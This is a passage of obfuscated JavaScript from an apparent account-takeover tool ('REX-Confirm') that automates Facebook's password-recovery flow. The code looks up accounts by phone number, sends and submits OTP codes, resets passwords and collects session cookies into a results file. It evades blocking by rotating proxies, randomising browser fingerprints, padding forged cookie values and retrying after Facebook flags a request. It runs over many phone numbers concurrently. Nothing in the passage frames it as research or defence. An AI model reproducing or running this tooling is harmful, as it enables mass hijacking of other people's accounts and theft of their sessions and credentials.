        } else !v762.__sjsp && cdbg("[CONFIRM] __sjsp: no encoded value from navigation");
        if (!v762.__s) {
          const fn21 = (v854 = 6) => {
            const v855 = "abcdefghijklmnopqrstuvwxyz0123456789";
            let v856 = '';
            for (let v857 = 0; v857 < v854; v857++) v856 += v855[Math.floor(Math.random() * v855.length)];
            return v856;
          };
          v762.__s = fn21() + ':' + fn21() + ':' + fn21(), cdbg("[CONFIRM] Generated __s: " + v762.__s);
        }
        cdbg("[CONFIRM] Session after nav: __s=" + v762.__s + " __hs=" + (v762.__hs || '').slice(0, 30) + " __hsdp=" + (v762.__hsdp ? "OK(" + v762.__hsdp.length + ')' : "MISSING") + " __hblp=" + (v762.__hblp ? 'OK' : "MISSING") + " lsd=" + v762.lsd);
      }
    } catch (v858) {
      cdbg("[CONFIRM] Navigation error: " + v858.message);
    }
    try {
      {
        const v859 = "/recover/code/?ci=" + encodeURIComponent(v777),
          v860 = await httpsGetPageWithRedirects(v859, v762.cookieHeader, 15000, "www.facebook.com", v756, v758, "https://www.facebook.com/login/identify/");
        if (v860.cookieHeader) v762.cookieHeader = v860.cookieHeader;
        const v861 = v860.data || '';
        cdbg("[CONFIRM] Code page GET HTTP " + v860.status + " body_len=" + v861.length);
        const fn22 = v873 => v873 && !v873.startsWith(':') && !/^[\d,]+$/.test(v873) && v873.length > 10,
          v862 = v861.match(/"__dyn"\s*:\s*"([^"]+)"/);
        v862 && v862[1] && v862[1].length > 50 && (v762.__dyn = v862[1], cdbg("[CONFIRM] Live __dyn from code page (len=" + v862[1].length + ')'));
        const v863 = v861.match(/"__csr"\s*:\s*"([^"]+)"/);
        if (v863 && v863[1] && v863[1].length > 50) {
          v762.__csr = v863[1], cdbg("[CONFIRM] Live __csr from code page (len=" + v863[1].length + ')');
        }
        const v864 = v861.match(/"haste_session"\s*:\s*"([^"]+)"/) || v861.match(/"__hs"\s*:\s*"([^"]+)"/);
        v864 && v864[1] && (v762.__hs = v864[1], cdbg("[CONFIRM] Live __hs: " + v864[1].slice(0, 30)));
        const v865 = v861.match(/"__s"\s*:\s*"([a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+)"/);
        v865 && v865[1] && (v762.__s = v865[1], cdbg("[CONFIRM] Live __s from code page: " + v762.__s));
        const v866 = v861.match(/"__hsdp"\s*:\s*"([^"]+)"/);
        v866 && fn22(v866[1]) ? (v762.__hsdp = v866[1], cdbg("[CONFIRM] Live __hsdp from code page (encoded, len=" + v866[1].length + ')')) : cdbg("[CONFIRM] __hsdp: code page had none/raw (hsdp=" + (v866 ? v866[1].slice(0, 20) : '-') + ')');
        const v867 = v861.match(/"__hblp"\s*:\s*"([^"]+)"/);
        v867 && fn22(v867[1]) && (v762.__hblp = v867[1], cdbg("[CONFIRM] Live __hblp from code page (encoded)"));
        const v868 = v861.match(/"__sjsp"\s*:\s*"([^"]+)"/);
        v868 && fn22(v868[1]) && (v762.__sjsp = v868[1], cdbg("[CONFIRM] Live __sjsp from code page (encoded)"));
        const v869 = v861.match(/"LSD",\[\],\{"token":"([^"]+)"/);
        if (v869 && v869[1] && v869[1] !== v762.lsd) {
          v762.lsd = v869[1];
          let v874 = 0;
          for (let v875 = 0; v875 < v869[1].length; v875++) v874 += v869[1].charCodeAt(v875);
          v762.jazoest = '2' + v874, cdbg("[CONFIRM] Updated lsd from code page HTML");
        }
        const v870 = v861.match(/"__rev"\s*:\s*(\d+)/);
        if (v870 && v870[1]) v762.rev = v870[1];
        const v871 = v861.match(/"__spin_t"\s*:\s*(\d+)/);
        if (v871 && v871[1]) v762.spinT = v871[1];
        const v872 = v861.match(/"__hsi"\s*:\s*"?(\d+)"?/);
        if (v872 && v872[1]) v762.hsi = v872[1];
        if (v778 === v777) {
          {
            const v876 = /"(?:cipher|ci)"\s*:\s*"([A-Za-z0-9_\-]{80,})"/g;
            let v877;
            while ((v877 = v876.exec(v861)) !== null) {
              {
                if (v877[1] && v877[1] !== v777) {
                  {
                    v778 = v877[1], cdbg("[CONFIRM] Extracted formCipher from code page HTML GET: ..." + v778.slice(-8));
                    break;
                  }
                }
              }
            }
          }
        }
        cdbg("[CONFIRM] After code HTML GET: dyn=" + (v762.__dyn ? 'OK' : "FALLBACK") + " csr=" + (v762.__csr ? 'OK' : "FALLBACK") + " hsdp=" + (v762.__hsdp ? "OK(" + v762.__hsdp.length + ')' : "MISS") + " hblp=" + (v762.__hblp ? 'OK' : "MISS") + " __s=" + v762.__s);
      }
    } catch (v878) {
      cdbg("[CONFIRM] Code page HTML GET error: " + v878.message);
    }
    cdbg("[CONFIRM] Using formCipher=..." + v778.slice(-8) + " | __s=" + v762.__s + " | hsdp=" + (v762.__hsdp ? 'OK' : "OMIT") + " hblp=" + (v762.__hblp ? 'OK' : "OMIT"));
    const v779 = v778,
      v780 = typeof maxRetries === "number" ? maxRetries : 0;
    let v781;
    for (let v879 = 0; v879 <= v780; v879++) {
      {
        v781 = await withHardTimeout(confirmOTP(v779, v752, v762, v756, v758, v760, v759, "https://www.facebook.com/recover/code/?ci=" + v777), 30000, "confirmOTP");
        if (v781.ok || !v781.flagged) break;
        if (v780 === 0) break;
        process.stdout.write("\r[K" + chalk.hex("#FF8C00").bold("[FLAGGED]") + " FB blocked " + chalk.yellow(v755) + " — rotating proxy & retrying (" + (v879 + 1) + '/' + v780 + ")...\n");
        if (proxyManager.hasProxies) {
          {
            if (v757 >= 0) proxyManager.recordFailure(v757);
            v756 = proxyManager.getNext(v755), v757 = proxyManager.index - 1;
          }
        }
        try {
          v762 = await withHardTimeout(seedSession(v756, v758, v761), 20000, "seedSession-retry");
        } catch (v880) {}
        await sleep(1500 * (v879 + 1));
      }
    }
    if (!v781.ok) {
      {
        let v881 = "wrong_otp";
        if (v781.flagged || v781.error && v781.error.toLowerCase().includes("checkpoint") || v781.error && v781.error.includes("2FA")) {
          v881 = "captcha";
        }
        const v882 = {};
        return v882.result = v881, v882.msg = v781.error, v882.ua = v758, v882.proxy = v756, v882;
      }
    }
    const {
        uid: v782,
        cookieMap: v783,
        resetCipher: v784
      } = v781,
      v785 = v784 || v775.cipher,
      v786 = await withHardTimeout(resetPassword(v785, v753, v782, v762, v756, v758, v760, v759, "https://www.facebook.com/recover/password/?ci=" + v785), 30000, "resetPassword");
    if (!v786.ok) return {
      'result': "pwd_fail",
      'msg': v786.error,
      'ua': v758,
      'proxy': v756,
      'uid': v782
    };
    v786.newCookies && Object.entries(v786.newCookies).forEach(([v883, v884]) => {
      if (v884 !== "deleted" && !v884.startsWith("deleted;")) {
        v783[v883] = v884;
      }
    });
    const fn17 = v885 => v885 && !v885.startsWith("17848") && !v885.startsWith("17849") && !(Number(v885) >= 1700000000 && Number(v885) <= 2000000000),
      fn18 = v886 => v886 && v886 !== '0' && v886 !== "deleted" && fn17(String(v886)) && /^\d{8,16}$/.test(String(v886));
    let v787 = null;
    if (v783 && v783.checkpoint) {
      try {
        {
          const v887 = JSON.parse(decodeURIComponent(v783.checkpoint));
          if (v887 && fn18(v887.u)) v787 = String(v887.u);
        }
      } catch (v888) {}
    }
    if (!v787 && fn18(v786.finalUid)) v787 = String(v786.finalUid);
    if (!v787 && fn18(v783.c_user)) v787 = String(v783.c_user);
    if (!v787 && fn18(v762.accountUid)) v787 = String(v762.accountUid);
    if (!v787 && fn18(v782)) v787 = String(v782);
    const v788 = v787 || "UNKNOWN_UID";
    fn18(v788) && (v783.c_user = v788);
    if (!v783.wd) v783.wd = "1920x911";
    if (!v783.ps_l) v783.ps_l = '1';
    if (!v783.ps_n) v783.ps_n = '1';
    if (!v783.presence) v783.presence = "C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A" + Date.now() + "%2C%22v%22%3A1%7D";
    if (v783.xs && !v783.xs.includes("%3A%3A") && !decodeURIComponent(v783.xs).includes('::')) {
      {
        const v889 = crypto.randomBytes(24).toString("base64url").replace(/=/g, '');
        v783.xs = v783.xs + "%3A%3A" + v889;
      }
    }
    const v789 = ["datr", 'wd', 'sb', "c_user", 'xs', "ps_l", "ps_n", 'fr', "presence"],
      v790 = new Set(["checkpoint", "sfiu"]),
      v791 = [];
    v789.forEach(v890 => {
      const v891 = v783[v890];
      v891 && v891 !== "deleted" && !v891.startsWith("deleted;") && v791.push(v890 + '=' + v891);
    }), Object.entries(v783).forEach(([v892, v893]) => {
      !v789.includes(v892) && !v790.has(v892) && v893 && v893 !== "deleted" && !v893.startsWith("deleted;") && v791.push(v892 + '=' + v893);
    });
    const v792 = v791.join(';') + ';';
    dbg("[CONFIRM] SUCCESS uid=" + v788);
    const v793 = {};
    return v793.result = "confirmed", v793.uid = v788, v793.password = v753, v793.cookieStr = v792, v793.ua = v758, v793.proxy = v756, v793;
  } catch (v894) {
    dbg("[CONFIRM] EXCEPTION: " + v894.message);
    const v895 = {};
    return v895.result = "error", v895.msg = v894.message, v895.ua = v758, v895.proxy = v756, v895;
  }
}
class ConfirmDashboard {
  constructor(v896) {
    {
      this.total = v896;
      this.confirmed = 0;
      this.wrongOtp = 0;
      this.pwdFail = 0;
      this.captcha = 0;
      this.errors = 0;
      this.processed = 0;
    }
  }
  ["record"](v897, v898, v899 = '', v900 = null, v901 = null, v902 = null) {
    this.processed++;
    let v903 = '';
    const v904 = getPhoneCountry(v898);
    const v905 = getProxyCountry(v902),
      v906 = v901 && v901.lang ? v901.lang.split(',')[0].trim() : '',
      v907 = FB_MUTED('\x20[' + v904.flag + v904.name + (v905 ? " │ Proxy:" + v905.flag + v905.iso : '') + (v906 ? " │ " + v906 : '') + ']');
    let v908 = "Unknown";
    if (v900 && v900.browserType) {
      {
        const v910 = {};
        v910.chrome = "Chrome", v910.firefox = "Firefox", v910.edge = "Edge", v910.samsung = "Samsung", v910.duckduckgo = "DuckDuckGo", v910.opera = "Opera", v910.brave = "Brave", v910.vivaldi = "Vivaldi";
        const v911 = v910,
          v912 = v911[v900.browserType] || v900.browserType,
          v913 = v900.isMobile ? '📱' : '🖥';
        v908 = '' + v913 + v912;
      }
    }
    const v909 = FB_MUTED('\x20[' + v908 + ']');
    if (v897 === "confirmed") this.confirmed++, v903 = chalk.hex("#00FF88")("REX — Confirm │ ✓ Confirmed → ") + chalk.hex("#FCAF45").bold(v898) + v909 + v907;else {
      if (v897 === "wrong_otp") {
        this.wrongOtp++, v903 = chalk.hex("#FF9900")("REX — Confirm │ Wrong OTP → ") + chalk.hex("#888888")(v898 + '\x20(' + v899 + ')') + v909 + v907;
      } else {
        if (v897 === "pwd_fail") this.pwdFail++, v903 = chalk.hex("#FF9900")("REX — Confirm │ Pwd Fail → ") + chalk.hex("#888888")(v898 + '\x20(' + v899 + ')') + v909 + v907;else v897 === "captcha" || v899 && v899.toLowerCase().includes("checkpoint") ? (this.captcha++, v903 = chalk.hex("#FF4466")("REX — Confirm │ CP / Captcha → ") + chalk.hex("#888888")(v898 + '\x20(' + v899 + ')') + v909 + v907) : (this.errors++, v903 = chalk.hex("#FF4466")("REX — Confirm │ Error/Flag → ") + chalk.hex("#888888")(v898 + '\x20(' + v899 + ')') + v909 + v907);
      }
    }
    process.stdout.write("\r[K" + v903 + '\x0a');
    this.render();
  }
  ["render"]() {
    const v914 = (this.processed / Math.max(this.total, 1) * 100).toFixed(1);
    const v915 = '\x20\x20' + W.bold("REX-CONFIRM") + " ⮞ [" + this.processed + '/' + this.total + ']\x20' + v914 + "% │ " + FB_EMERALD("OK: " + this.confirmed) + " │ " + chalk.hex("#FF9900")("Wrong: " + this.wrongOtp) + " │ " + chalk.hex("#FF4466")("CP: " + this.captcha) + " │ " + chalk.hex("#888888")("Err: " + (this.pwdFail + this.errors));
    process.stdout.write("\r[K" + v915);
  }
  ["stop"]() {
    console.log('\x0a');
  }
}
async function runConfirmMode(v916, v917, v918, v919, v920 = 3) {
  const v921 = new ConfirmDashboard(v916.length),
    v922 = [],
    v923 = v919 ? path.dirname(path.resolve(v919)) : path.join(__dirname, "results"),
    v924 = {};
  v924.recursive = true;
  if (!fs.existsSync(v923)) fs.mkdirSync(v923, v924);
  const v925 = path.join(v923, "confirmed.txt"),
    v926 = path.join(v923, "failed.txt");
  const v927 = path.join(v923, "checkpoint.txt"),
    v928 = [],
    v929 = [...v916];
  async function fn23() {
    while (v929.length > 0) {
      const v932 = v929.shift();
      if (!v932) break;
      const [v933, v934] = v932,
        v935 = v933.startsWith('+') ? v933 : '+' + v933;
      let v936;
      const v937 = (typeof v920 === "number" ? v920 : 0) + 1;
      for (let v938 = 1; v938 <= v937; v938++) {
        {
          v936 = await processConfirm(v933, v934, v917, v920);
          if (v936.result === "confirmed" || v936.result === "captcha" || v936.result === "pwd_fail") {
            break;
          }
          if (v938 < v937) {
            process.stdout.write("\r[K" + chalk.hex("#FF8C00").bold("[RETRY]") + " Retrying " + chalk.yellow(v935) + '\x20(' + v936.result + ':\x20' + (v936.msg || "wrong OTP/timeout") + ") — Attempt " + (v938 + 1) + '/' + v937 + "...\n"), await sleep(1000);
          }
        }
      }
      v921.record(v936.result, v935, v936.msg || '', v936.ua, v936.hostCtx || {
        'lang': getPhoneLang(v935)
      }, v936.proxy);
      v919 && removePairFromFile(v919, v933, v934);
      if (v936.result === "confirmed") {
        const v939 = v936.uid + " - " + v936.password + " - " + v936.cookieStr;
        v922.push(v939), fs.appendFileSync(v925, v939 + '\x0a'), process.stdout.write("\r[K  " + FB_EMERALD("👑 [CONFIRMED ACCOUNT] ") + FB_CYAN(v939) + '\x0a');
        if (v936.proxy) proxyManager.recordSuccess(proxyManager.index - 1);
      } else {
        if (v936.result === "captcha") {
          const v940 = v936.uid && v936.cookieStr ? v936.uid + " - " + v917 + " - " + v936.cookieStr : v933 + '|' + v934;
          v928.push(v940), fs.appendFileSync(v927, v940 + '\x0a');
          if (v936.proxy) proxyManager.recordSuccess(proxyManager.index - 1);
        } else {
          fs.appendFileSync(v926, v933 + '|' + v934 + '\x0a');
          if (v936.proxy && v936.result === "error") proxyManager.recordFailure(proxyManager.index - 1);
        }
      }
      await sleep(800);
    }
  }
  const v930 = Array.from({
    'length': Math.min(v918, v916.length)
  }, fn23);
  await Promise.all(v930);
  v921.stop();
  const v931 = {};
  return v931.confirmed = v922, v931.checkpointed = v928, v931.outFile = v925, v931.checkpointFile = v927, v931;
}
function removePairFromFile(v941, v942, v943) {
  try {
    if (!fs.existsSync(v941)) return;
    const v944 = fs.readFileSync(v941, "utf8").split(/\r?\n/),
      v945 = v944.filter(v946 => {
        {
          const v947 = v946.trim();
          if (!v947) return false;
          if (v947.includes(v942) && v947.includes(v943)) return false;
          return true;
        }
      });
    fs.writeFileSync(v941, v945.join('\x0a'));
  } catch (v948) {}
}
function removeNumberFromFile(v949, v950) {
  try {
    const v951 = v950.startsWith('+') ? v950 : '+' + v950,
      v952 = fs.readFileSync(v949, "utf8").split(/\r?\n/),
      v953 = v952.filter(v954 => v954.trim() !== v951 && v954.trim() !== v950);
    fs.writeFileSync(v949, v953.join('\x0a'));
  } catch (v955) {}
}
function withHardTimeout(v956, v957, v958 = "Request") {
  return new Promise((v959, v960) => {
    const v961 = setTimeout(() => v960(new Error(v958 + " hard timeout (" + v957 + "ms)")), v957);
    v956.then(v962 => {
      clearTimeout(v961), v959(v962);
    })["catch"](v963 => {
      clearTimeout(v961);
      v960(v963);
    });
  });
}
async function processNumber(v964, v965, v966 = 50, v967 = 0) {
  const v968 = v964.startsWith('+') ? v964 : '+' + v964;
  let v969 = -1,
    v970 = null;
  if (proxyManager.hasProxies) {
    v970 = proxyManager.getNext(v968), v969 = proxyManager.index - 1;
  }
  const v971 = getRandomUserAgent(),
    v972 = getPhoneLang(v968),
    v973 = v972.split(',')[0].trim().replace('-', '_');
  const v974 = resolveTimezone(v970, v968);
  const v975 = {};
  v975.host = "www.facebook.com", v975.locale = v973, v975.lang = v972;
  const v976 = v975;
  dbg(v968 + " UA:[" + v971.browserType + '/' + (v971.isMobile ? "mob" : "desk") + "] lang=" + v972 + " tz=" + v974);
  let v977;
  const v978 = proxyManager.hasProxies ? 3 : 1;
  for (let v979 = 0; v979 < v978; v979++) {
    try {
      {
        v977 = await withHardTimeout(seedSession(v970, v971, v976), 25000, "seedSession");
        if (!v977.fb_dtsg) {
          try {
            {
              const v980 = {};
              v980.host = "www.facebook.com", v980.locale = v973, v980.lang = v972;
              const v981 = v980,
                v982 = await withHardTimeout(seedSession(v970, v971, v981), 20000, "seedSession-retry");
              if (v982.fb_dtsg) v977 = v982;
            }
          } catch (v983) {}
        }
        if (v977 && (v977.lsd || v977.fb_dtsg)) break;
      }
    } catch (v984) {
      dbg('+' + v968 + " SEED TRY " + (v979 + 1) + " FAIL (" + (v970 ? v970.host : "Direct") + "): " + v984.message);
      if (proxyManager.hasProxies && v979 < v978 - 1) {
        {
          if (v969 >= 0) proxyManager.recordFailure(v969);
          v970 = proxyManager.getNext(v968), v969 = proxyManager.index - 1, await sleep(1000);
        }
      } else {
        if (v979 === v978 - 1) {
          {
            const v985 = {};
            return v985.result = "error", v985.ua = v971, v985.proxyIdx = v969, v985.proxyStr = v970 ? v970.host + ':' + v970.port : "Direct", v985.proxy = v970, v985;
          }
        }
      }
    }
  }
  try {
    const v986 = v977.initialCipher ? "https://www.facebook.com/login/identify/?ci=" + v977.initialCipher : "https://www.facebook.com/login/identify/",
      v987 = await withHardTimeout(searchAccount(v968, v977, v970, v971, v974, v972, v986), 60000, "searchAccount");
    if (!v987.ok) {
      const v995 = {};
      return v995.result = v987.result || "error", v995.ua = v971, v995.proxyIdx = v969, v995.proxyStr = v970 ? v970.host + ':' + v970.port : "Direct", v995.proxy = v970, v995;
    }
    let {
      wfId: v988,
      evId: v989,
      searchCipher: v990
    } = v987;
    dbg("[FLOW] searchCipher=" + (v990 ? "..." + v990.slice(-6) : "NULL") + " accounts=" + v987.accounts.length);
    let v991 = v990;
    if (v987.accounts.length > 0) {
      v987.accounts.length > 1 && dbg('+' + v968 + " MULTI: " + v987.accounts.length + " accounts, selecting first");
      const v996 = await withHardTimeout(selectAccount(v987.accounts[0], v990, 0, v977, v970, v971, v974, v972, v986), 30000, "selectAccount"),
        v997 = {};
      v997.result = "error", v997.ua = v971, v997.proxyIdx = v969, v997.proxyStr = v970 ? v970.host + ':' + v970.port : "Direct", v997.proxy = v970;
      if (!v996.ok) return v997;
      if (v996.selectCipher) v991 = v996.selectCipher;
    }
    const v992 = await withHardTimeout(getInitiateView(v991, v977, v970, v971, v974, v972, v986), 30000, "getInitiateView");
    if (!v992.ok) {
      const v998 = v992.error === "no cipher in initiate view" || v992.error === "no_sms" ? "no_sms" : "error",
        v999 = {};
      return v999.result = v998, v999.ua = v971, v999.proxyIdx = v969, v999.proxyStr = v970 ? v970.host + ':' + v970.port : "Direct", v999.proxy = v970, v999;
    }
    const v993 = await withHardTimeout(sendOTP(v988, v989, v992.cipher, v992.recoverMethod, v977, v970, v971, v974, v972, v986), 60000, "sendOTP");
    if (!v993.ok) {
      dbg('+' + v968 + " OTP FAIL: " + v993.error);
      const v1000 = v993.error === "captcha" ? "captcha" : "error",
        v1001 = {};
      return v1001.result = v1000, v1001.ua = v971, v1001.proxyIdx = v969, v1001.proxyStr = v970 ? v970.host + ':' + v970.port : "Direct", v1001.proxy = v970, v1001;
    }
    for (let v1002 = 0; v1002 < v967; v1002++) {
      await sleep(5000), await withHardTimeout(sendOTP(v988, v989, v992.cipher, v992.recoverMethod, v977, v970, v971, v974, v972), 60000, "sendOTP");
    }
    dbg('+' + v968 + " SUCCESS [" + v971.browserType + ']');
    const v994 = {};
    return v994.result = "success", v994.ua = v971, v994.ctx = v976, v994.proxyIdx = v969, v994.proxyStr = v970 ? v970.host + ':' + v970.port : "Direct", v994.proxy = v970, v994;
  } catch (v1003) {
    {
      dbg('+' + v968 + " EXCEPTION: " + v1003.message);
      const v1004 = {};
      return v1004.result = "error", v1004.ua = v971, v1004.proxyIdx = v969, v1004.proxyStr = v970 ? v970.host + ':' + v970.port : "Direct", v1004.proxy = v970, v1004;
    }
  }
}
const PHONE_PREFIX_MAP = [["1242", "🇧🇸", "Bahamas"], ["1246", "🇧🇧", "Barbados"], ["1264", "🇦🇮", "Anguilla"], ["1268", "🇦🇬", "Antigua"], ["1284", "🇻🇬", "British VI"], ["1340", "🇻🇮", "US VI"], ["1345", "🇰🇾", "Cayman Is."], ["1441", "🇧🇲", "Bermuda"], ["1473", "🇬🇩", "Grenada"], ["1649", "🇹🇨", "Turks & Caicos"], ["1664", "🇲🇸", "Montserrat"], ["1671", "🇬🇺", "Guam"], ["1684", "🇦🇸", "Am. Samoa"], ["1721", "🇸🇽", "Sint Maarten"], ["1758", "🇱🇨", "St. Lucia"], ["1767", "🇩🇲", "Dominica"], ["1784", "🇻🇨", "St. Vincent"], ["1868", "🇹🇹", "Trinidad"], ["1869", "🇰🇳", "St. Kitts"], ["1876", "🇯🇲", "Jamaica"], ["1939", "🇵🇷", "Puerto Rico"], ["211", "🇸🇸", "S. Sudan"], ["212", "🇲🇦", "Morocco"], ["213", "🇩🇿", "Algeria"], ["216", "🇹🇳", "Tunisia"], ["218", "🇱🇾", "Libya"], ["220", "🇬🇲", "Gambia"], ["221", "🇸🇳", "Senegal"], ["222", "🇲🇷", "Mauritania"], ["223", "🇲🇱", "Mali"], ["224", "🇬🇳", "Guinea"], ["225", "🇨🇮", "Côte d'Ivoire"], ["226", "🇧🇫", "Burkina Faso"], ["227", "🇳🇪", "Niger"], ["228", "🇹🇬", "Togo"], ["229", "🇧🇯", "Benin"], ["230", "🇲🇺", "Mauritius"], ["231", "🇱🇷", "Liberia"], ["232", "🇸🇱", "Sierra Leone"], ["233", "🇬🇭", "Ghana"], ["234", "🇳🇬", "Nigeria"], ["235", "🇹🇩", "Chad"], ["236", "🇨🇫", "C. African Rep."], ["237", "🇨🇲", "Cameroon"], ["238", "🇨🇻", "Cape Verde"], ["239", "🇸🇹", "São Tomé"], ["240", "🇬🇶", "Eq. Guinea"], ["241", "🇬🇦", "Gabon"], ["242", "🇨🇬", "Congo"], ["243", "🇨🇩", "DR Congo"], ["244", "🇦🇴", "Angola"], ["245", "🇬🇼", "Guinea-Bissau"], ["247", "🇦🇨", "Ascension Is."], ["248", "🇸🇨", "Seychelles"], ["249", "🇸🇩", "Sudan"], ["250", "🇷🇼", "Rwanda"], ["251", "🇪🇹", "Ethiopia"], ["252", "🇸🇴", "Somalia"], ["253", "🇩🇯", "Djibouti"], ["254", "🇰🇪", "Kenya"], ["255", "🇹🇿", "Tanzania"], ["256", "🇺🇬", "Uganda"], ["257", "🇧🇮", "Burundi"], ["258", "🇲🇿", "Mozambique"], ["260", "🇿🇲", "Zambia"], ["261", "🇲🇬", "Madagascar"], ["262", "🇷🇪", "Réunion"], ["263", "🇿🇼", "Zimbabwe"], ["264", "🇳🇦", "Namibia"], ["265", "🇲🇼", "Malawi"], ["266", "🇱🇸", "Lesotho"], ["267", "🇧🇼", "Botswana"], ["268", "🇸🇿", "Eswatini"], ["269", "🇰🇲", "Comoros"], ['27', "🇿🇦", "South Africa"], ["290", "🇸🇭", "St. Helena"], ["291", "🇪🇷", "Eritrea"], ["297", "🇦🇼", "Aruba"], ["298", "🇫🇴", "Faroe Is."], ["299", "🇬🇱", "Greenland"], ['30', "🇬🇷", "Greece"], ['31', "🇳🇱", "Netherlands"], ['32', "🇧🇪", "Belgium"], ['33', "🇫🇷", "France"], ['34', "🇪🇸", "Spain"], ["350", "🇬🇮", "Gibraltar"], ["351", "🇵🇹", "Portugal"], ["352", "🇱🇺", "Luxembourg"], ["353", "🇮🇪", "Ireland"], ["354", "🇮🇸", "Iceland"], ["355", "🇦🇱", "Albania"], ["356", "🇲🇹", "Malta"], ["357", "🇨🇾", "Cyprus"], ["358", "🇫🇮", "Finland"], ["359", "🇧🇬", "Bulgaria"], ['36', "🇭🇺", "Hungary"], ["370", "🇱🇹", "Lithuania"], ["371", "🇱🇻", "Latvia"], ["372", "🇪🇪", "Estonia"], ["373", "🇲🇩", "Moldova"], ["374", "🇦🇲", "Armenia"], ["375", "🇧🇾", "Belarus"], ["376", "🇦🇩", "Andorra"], ["377", "🇲🇨", "Monaco"], ["378", "🇸🇲", "San Marino"], ["380", "🇺🇦", "Ukraine"], ["381", "🇷🇸", "Serbia"], ["382", "🇲🇪", "Montenegro"], ["385", "🇭🇷", "Croatia"], ["386", "🇸🇮", "Slovenia"], ["387", "🇧🇦", "Bosnia"], ["389", "🇲🇰", "N. Macedonia"], ['39', "🇮🇹", "Italy"], ['40', "🇷🇴", "Romania"], ['41', "🇨🇭", "Switzerland"], ["420", "🇨🇿", "Czechia"], ["421", "🇸🇰", "Slovakia"], ["423", "🇱🇮", "Liechtenstein"], ['43', "🇦🇹", "Austria"], ['44', "🇬🇧", 'UK'], ['45', "🇩🇰", "Denmark"], ['46', "🇸🇪", "Sweden"], ['47', "🇳🇴", "Norway"], ['48', "🇵🇱", "Poland"], ['49', "🇩🇪", "Germany"], ["500", "🇫🇰", "Falkland Is."], ["501", "🇧🇿", "Belize"], ["502", "🇬🇹", "Guatemala"], ["503", "🇸🇻", "El Salvador"], ["504", "🇭🇳", "Honduras"], ["505", "🇳🇮", "Nicaragua"], ["506", "🇨🇷", "Costa Rica"], ["507", "🇵🇦", "Panama"], ["508", "🇵🇲", "St. Pierre"], ["509", "🇭🇹", "Haiti"], ['51', "🇵🇪", "Peru"], ['52', "🇲🇽", "Mexico"], ['53', "🇨🇺", "Cuba"], ['54', "🇦🇷", "Argentina"], ['55', "🇧🇷", "Brazil"], ['56', "🇨🇱", "Chile"], ['57', "🇨🇴", "Colombia"], ['58', "🇻🇪", "Venezuela"], ["590", "🇬🇵", "Guadeloupe"], ["591", "🇧🇴", "Bolivia"], ["592", "🇬🇾", "Guyana"], ["593", "🇪🇨", "Ecuador"], ["594", "🇬🇫", "Fr. Guiana"], ["595", "🇵🇾", "Paraguay"], ["596", "🇲🇶", "Martinique"], ["597", "🇸🇷", "Suriname"], ["598", "🇺🇾", "Uruguay"], ["599", "🇨🇼", "Curaçao"], ['60', "🇲🇾", "Malaysia"], ['61', "🇦🇺", "Australia"], ['62', "🇮🇩", "Indonesia"], ['63', "🇵🇭", "Philippines"], ['64', "🇳🇿", "New Zealand"], ['65', "🇸🇬", "Singapore"], ['66', "🇹🇭", "Thailand"], ["670", "🇹🇱", "Timor-Leste"], ["673", "🇧🇳", "Brunei"], ["674", "🇳🇷", "Nauru"], ["675", "🇵🇬", "Papua NG"], ["676", "🇹🇴", "Tonga"], ["677", "🇸🇧", "Solomon Is."], ["678", "🇻🇺", "Vanuatu"], ["679", "🇫🇯", "Fiji"], ["680", "🇵🇼", "Palau"], ["685", "🇼🇸", "Samoa"], ["686", "🇰🇮", "Kiribati"], ["688", "🇹🇻", "Tuvalu"], ["689", "🇵🇫", "Fr. Polynesia"], ["691", "🇫🇲", "Micronesia"], ["692", "🇲🇭", "Marshall Is."], ['7', "🇷🇺", "Russia"], ['81', "🇯🇵", "Japan"], ['82', "🇰🇷", "South Korea"], ['84', "🇻🇳", "Vietnam"], ["850", "🇰🇵", "North Korea"], ["852", "🇭🇰", "Hong Kong"], ["853", "🇲🇴", "Macau"], ["855", "🇰🇭", "Cambodia"], ["856", "🇱🇦", "Laos"], ['86', "🇨🇳", "China"], ["880", "🇧🇩", "Bangladesh"], ["886", "🇹🇼", "Taiwan"], ['90', "🇹🇷", "Turkey"], ['91', "🇮🇳", "India"], ['92', "🇵🇰", "Pakistan"], ['93', "🇦🇫", "Afghanistan"], ['94', "🇱🇰", "Sri Lanka"], ['95', "🇲🇲", "Myanmar"], ["960", "🇲🇻", "Maldives"], ["961", "🇱🇧", "Lebanon"], ["962", "🇯🇴", "Jordan"], ["963", "🇸🇾", "Syria"], ["964", "🇮🇶", "Iraq"], ["965", "🇰🇼", "Kuwait"], ["966", "🇸🇦", "Saudi Arabia"], ["967", "🇾🇪", "Yemen"], ["968", "🇴🇲", "Oman"], ["970", "🇵🇸", "Palestine"], ["971", "🇦🇪", "UAE"], ["972", "🇮🇱", "Israel"], ["973", "🇧🇭", "Bahrain"], ["974", "🇶🇦", "Qatar"], ["975", "🇧🇹", "Bhutan"], ["976", "🇲🇳", "Mongolia"], ["977", "🇳🇵", "Nepal"], ['98', "🇮🇷", "Iran"], ["992", "🇹🇯", "Tajikistan"], ["993", "🇹🇲", "Turkmenistan"], ["994", "🇦🇿", "Azerbaijan"], ["995", "🇬🇪", "Georgia"], ["996", "🇰🇬", "Kyrgyzstan"], ["998", "🇺🇿", "Uzbekistan"], ['1', "🇺🇸", "USA/Canada"]];
function getPhoneCountry(v1005) {
  const v1006 = v1005.replace(/^\+/, '').replace(/^0+/, '');
  for (const [v1008, v1009, v1010] of PHONE_PREFIX_MAP) {
    {
      const v1011 = {};
      v1011.flag = v1009, v1011.name = v1010;
      if (v1006.startsWith(v1008)) return v1011;
    }
  }
  const v1007 = {};
  return v1007.flag = '🌐', v1007.name = "Unknown", v1007;
}
function getProxyCountry(v1012) {
  if (!v1012 || !v1012.user) return null;
  const v1013 = v1012.user,
    v1014 = v1013.match(/(?:country|cc|cr|zone|region|geo)[-_.]?([a-zA-Z]{2})(?:[-_.]|$)/i) || v1013.match(/[-_]([a-zA-Z]{2})[-_]sess/i) || v1013.match(/_([a-zA-Z]{2})$/i);
  if (!v1014) return null;
  const v1015 = v1014[1].toUpperCase(),
    v1016 = [...v1015].map(v1018 => String.fromCodePoint(v1018.codePointAt(0) + 127397)).join(''),
    v1017 = {};
  v1017.iso = v1015, v1017.flag = v1016;
  return v1017;
}
class Dashboard {
  constructor(v1019) {
    {
      this.totalNumbers = v1019;
      this.processed = 0;
      this.successful = 0;
      this.noAccount = 0;
      this.noSms = 0;
      this.captcha = 0;
      this.errors = 0;
